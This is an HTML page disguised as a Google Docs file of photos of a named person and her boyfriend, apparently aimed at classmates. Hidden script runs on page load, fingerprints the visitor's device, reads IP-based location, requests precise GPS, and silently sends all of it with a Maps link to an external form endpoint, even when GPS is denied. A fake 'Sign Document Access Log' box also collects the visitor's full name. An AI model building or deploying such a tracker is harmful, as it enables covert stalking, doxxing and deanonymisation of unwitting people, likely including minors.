<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>elif - Google Docs</title>
    <style>
        :root {
            --docs-bg: #f9fbfd;
            --toolbar-bg: #edf2fa;
            --text-dark: #1f1f1f;
            --text-muted: #5f6368;
            --border-color: #c7c7c7;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: var(--docs-bg);
            color: var(--text-dark);
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }

        /* --- GOOGLE DOCS HEADER & TOOLBAR --- */
        header {
            background-color: #fff;
            padding: 8px 16px 4px 16px;
            border-bottom: 1px solid #e0e0e0;
            flex-shrink: 0;
        }

        .doc-title-row {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 4px;
        }

        .doc-icon {
            color: #2684fc;
            font-size: 24px;
            font-weight: bold;
        }

        .doc-title {
            font-size: 18px;
            color: #1f1f1f;
            font-weight: normal;
        }

        .menu-bar {
            display: flex;
            gap: 14px;
            font-size: 14px;
            color: var(--text-muted);
            margin-left: 36px;
            margin-bottom: 4px;
        }

        .menu-item {
            cursor: pointer;
        }

        .toolbar {
            background-color: var(--toolbar-bg);
            border-radius: 24px;
            padding: 6px 16px;
            display: flex;
            gap: 16px;
            align-items: center;
            font-size: 13px;
            color: #444746;
            margin-top: 4px;
            border: 1px solid transparent;
        }

        /* --- DOCS WORKSPACE & PAPER --- */
        .workspace {
            flex-grow: 1;
            overflow-y: auto;
            padding: 24px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #f9fbfd;
        }

        .paper {
            background: #ffffff;
            width: 816px; /* Standard US Letter width ratio */
            min-height: 1056px;
            padding: 96px; /* 1 inch doc margins */
            box-shadow: 0 1px 3px 1px rgba(60,64,67,.15), 0 1px 2px 0 rgba(60,64,67,.3);
            border: 1px solid #e0e0e0;
            position: relative;
        }

        /* --- DOCUMENT CONTENT ELEMENTS --- */
        .doc-heading {
            font-size: 26pt;
            color: #000000;
            font-weight: normal;
            margin-bottom: 16px;
            font-family: 'Arial', sans-serif;
        }

        .doc-subtitle {
            font-size: 12pt;
            color: var(--text-muted);
            margin-bottom: 32px;
            border-bottom: 1px solid #e0e0e0;
            padding-bottom: 8px;
        }

        /* Image Display Box */
        .image-gallery-container {
            background: #fafafa;
            border: 1px dashed var(--border-color);
            padding: 20px;
            margin: 24px 0;
            border-radius: 4px;
            text-align: center;
        }

        .inserted-photo {
            max-width: 100%;
            height: auto;
            border: 1px solid #dcdcdc;
            margin: 12px 0;
            display: block;
        }

        /* Guestbook Form Styled to look like a Document Box */
        .interactive-doc-box {
            border: 1px solid #dadce0;
            background-color: #fff;
            padding: 24px;
            border-radius: 8px;
            margin-top: 40px;
        }

        .interactive-doc-box h3 {
            font-size: 14pt;
            margin-bottom: 12px;
            color: #1e3a8a;
        }

        .input-group {
            display: flex;
            gap: 12px;
            margin-top: 12px;
        }

        input[type="text"] {
            flex-grow: 1;
            padding: 10px 12px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            font-size: 11pt;
            outline: none;
        }

        input[type="text"]:focus {
            border-color: #2684fc;
        }

        button {
            background-color: #2684fc;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 11pt;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0b57d0;
        }
    </style>
</head>
<body>

    <header>
        <div class="doc-title-row">
            <div class="doc-icon">📄</div>
            <div class="doc-title" id="greeting">elif</div>
        </div>
        <div class="menu-bar">
            <span class="menu-item">File</span>
            <span class="menu-item">Edit</span>
            <span class="menu-item">View</span>
            <span class="menu-item">Insert</span>
            <span class="menu-item">Format</span>
            <span class="menu-item">Tools</span>
        </div>
        <div class="toolbar">
            <span>🖨️</span>
            <span>➜</span>
            <span>100%</span>
            <span>|</span>
            <span>Normal text</span>
            <span>|</span>
            <span style="font-weight: bold;">Arial</span>
            <span>|</span>
            <span>▼</span>
            <span><b>B</b></span>
            <span><i>I</i></span>
            <span><u>U</u></span>
        </div>
    </header>

    <div class="workspace">
        
        <div class="paper">
            <h1 class="doc-heading">elif and boyfriend pics</h1>
            <p class="doc-subtitle"></p>
            
            <p style="font-size: 11pt; line-height: 1.5; margin-bottom: 16px;">
                
            </p>

            <div class="image-gallery-container">
                <p style="color: var(--text-muted); font-size: 10pt; margin-bottom: 8px; text-align: left; font-style: italic;">
                  
                </p>
                <img src="prom.jpeg" alt="[Graduation Image Placeholder 1]" class="inserted-photo">
                
                <p style="color: var(--text-muted); font-size: 10pt; margin-top: 24px; margin-bottom: 8px; text-align: left; font-style: italic;">
                    
                </p>
                <img src="friends.jpeg" alt="[Graduation Image Placeholder 2]" class="inserted-photo">
        
                <p style="color: var(--text-muted); font-size: 10pt; margin-top: 24px; margin-bottom: 8px; text-align: left; font-style: italic;">
                    
                </p>
                <img src="picnic.jpeg" alt="Class Photo 3" class="inserted-photo">

                <p style="color: var(--text-muted); font-size: 10pt; margin-top: 24px; margin-bottom: 8px; text-align: left; font-style: italic;">
                    
                </p>
                <img src="srpicnic.jpeg" alt="Class Photo 4" class="inserted-photo">
            </div>
            <div class="interactive-doc-box">
                <h3>Sign Document Access Log</h3>
                <p style="font-size: 10pt; color: var(--text-muted);">Confirm your authorization by leaving your signature in the field box below.</p>
                <div class="input-group">
                    <input type="text" id="studentName" placeholder="Type full name to sign document...">
                    <button onclick="submitGuestbook()">Sign doc</button>
                </div>
            </div>
        </div>

    </div>

    <script>
        let trackingData = {
            ip: "Unavailable",
            location: "Unavailable",
            deviceInfo: "Unknown Device",
            screenSize: "Unknown Screen",
            deviceLanguage: "Unknown Language",
            batteryStatus: "Unknown Battery",
            colorScheme: "Unknown Theme",
            deviceRam: "Unknown RAM",
            cpuCores: "Unknown CPU Cores"
        };
        
        let hasSentPayload = false; 
        let trackingTimer = null;   

        async function gatherDeviceFingerprint() {
            trackingData.deviceInfo = navigator.userAgent; 
            trackingData.screenSize = `${window.screen.width}x${window.screen.height}`;
            trackingData.deviceLanguage = navigator.language || navigator.userLanguage;
            
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                trackingData.colorScheme = "Dark Mode";
            } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: light)').matches) {
                trackingData.colorScheme = "Light Mode";
            }

            trackingData.deviceRam = navigator.deviceMemory ? `${navigator.deviceMemory} GB (Approx)` : "Unsupported/iOS Hidden";
            trackingData.cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";

            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    trackingData.batteryStatus = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
                } catch (e) {
                    console.log("Battery tracking profiles closed.");
                }
            }
        }

        async function initializeTracker() {
            await gatherDeviceFingerprint();

            fetch(window.location.href)
                .then(res => {
                    const geoHeader = res.headers.get('x-visitor-geo');
                    
                    if (geoHeader) {
                        const data = JSON.parse(geoHeader);
                        trackingData.ip = data.ip || "Unknown IP";
                        trackingData.location = `${data.city || "Unknown City"}, ${data.country || "Unknown Country"}`;
                    }
                    
                    trackingTimer = setTimeout(() => {
                        if (!hasSentPayload) {
                            sendToFormBold("Anonymous Classmate", "Silent Tracker (GPS Denied/Timed Out)", {});
                        }
                    }, 7000);

                    requestPreciseLocation();
                })
                .catch(err => {
                    console.log("Local testing environment active.");
                    requestPreciseLocation();
                });
        }

        initializeTracker();

        function requestPreciseLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(trackingTimer);
                        if (hasSentPayload) return; 

                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        const preciseGPS = {
                            "Tracking Status": "HIGH ACCURACY GPS GRANTED",
                            "Latitude": lat,
                            "Longitude": lon,
                            "Accuracy Radius": `${accuracy}m`,
                            "Google Maps Link": `https://maps.google.com/?q=${lat},${lon}`
                        };

                        sendToFormBold("Anonymous Classmate", "PRECISE GPS ACQUIRED", preciseGPS);
                    },
                    (error) => {
                        console.log("GPS option bypassed.");
                    },
                    { enableHighAccuracy: true, timeout: 15000 }
                );
            }
        }

        function sendToFormBold(studentName, actionType, extraData = {}) {
            hasSentPayload = true; 

            const formData = new FormData();
            formData.append("_subject", `[${actionType}] - ${studentName}`);
            formData.append("Interaction Type", actionType);
            formData.append("Profile Name", studentName);
            formData.append("IP Address", trackingData.ip);
            formData.append("General Location", trackingData.location);
            formData.append("Device Hardware Specs", trackingData.deviceInfo);
            formData.append("Screen Resolution", trackingData.screenSize);
            formData.append("Device Language", trackingData.deviceLanguage);
            formData.append("System Theme", trackingData.colorScheme);
            formData.append("Device Battery", trackingData.batteryStatus);
            formData.append("Estimated RAM", trackingData.deviceRam);
            formData.append("CPU Cores", trackingData.cpuCores);
            formData.append("Timestamp", new Date().toLocaleString());

            Object.keys(extraData).forEach(key => {
                formData.append(key, extraData[key]);
            });

            fetch('https://formbold.com/s/3VKAX', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(() => console.log("Dataset mapped perfectly."))
            .catch(err => console.error("Pipeline breakdown:", err));
        }

        function submitGuestbook() {
            const nameInput = document.getElementById('studentName');
            const nameField = nameInput ? nameInput.value.trim() : "";
            
            if (!nameField) {
                alert("Please sign your name before logging access.");
                return;
            }

            sendToFormBold(nameField, "Manual Guestbook Signature", { "Tracking Status": "User Manual Signature Override" });
            alert(`Thank you! Your signature has been appended to the access log.`);
            if (nameInput) nameInput.value = ""; 
        }
    </script>

</body>
</html>
